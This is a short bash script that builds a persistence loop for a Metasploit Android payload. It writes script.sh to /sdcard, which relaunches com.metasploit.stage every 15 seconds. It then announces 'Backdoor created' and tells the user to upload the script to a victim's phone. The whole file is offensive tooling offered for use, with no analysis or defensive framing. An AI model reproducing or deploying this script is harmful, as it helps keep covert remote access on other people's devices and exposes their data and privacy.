#!/bin/bash
gre='\033[1;32m'
cd /sdcard
rm -rf script.sh
touch script.sh
echo "while true" >> script.sh
echo "do am start --user 0 -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity" >> script.sh
echo "sleep 15 ">> script.sh
echo "done" >> script.sh
echo "$gre Backdoor created in the path `pwd`"
echo "$gre upload this script to vicim phone ....."
